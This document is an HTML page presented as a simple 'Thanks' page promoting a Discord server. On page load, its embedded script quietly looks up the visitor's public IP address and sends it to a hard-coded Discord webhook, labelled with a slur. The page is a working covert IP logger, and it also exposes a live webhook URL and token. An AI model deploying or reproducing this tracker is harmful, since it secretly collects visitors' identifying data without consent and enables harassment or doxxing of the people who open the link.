<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/drogen</title>
    <meta property="og:title" content="Danke!">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://i.imgur.com/9BrtuAf.jpeg">
    <meta property="og:description" content="discord.gg/drogen!">
    <meta name="theme-color" content="#11b9d6">
    <link rel="icon" type="image/png" href="https://i.imgur.com/9BrtuAf.jpeg">
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://i.imgur.com/VC0ma9Y.jpeg');
            background-size: cover;
        }

        #ip-address {
            font-size: 2em;
        }

        #title {
            font-size: 2em;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <h1 id="title">Thanks</h1>
    <p><span id="ip-address"></span></p>

    <script>
        function sendToDiscord(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1251266682823905372/GgVdvDQW50Zb8joQy85JA2yZn8ILNDyN9NdEpUdyvdJa2TPOsuWrSzHWjh-E_dpOjmvR';
            const data = {
                content: `Retard: ${ip}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function getIP(json) {
            const ipAddress = json.ip;
            document.getElementById("ip-address").textContent = ipAddress;
            sendToDiscord(ipAddress);
        }

        fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => getIP(data))
            .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
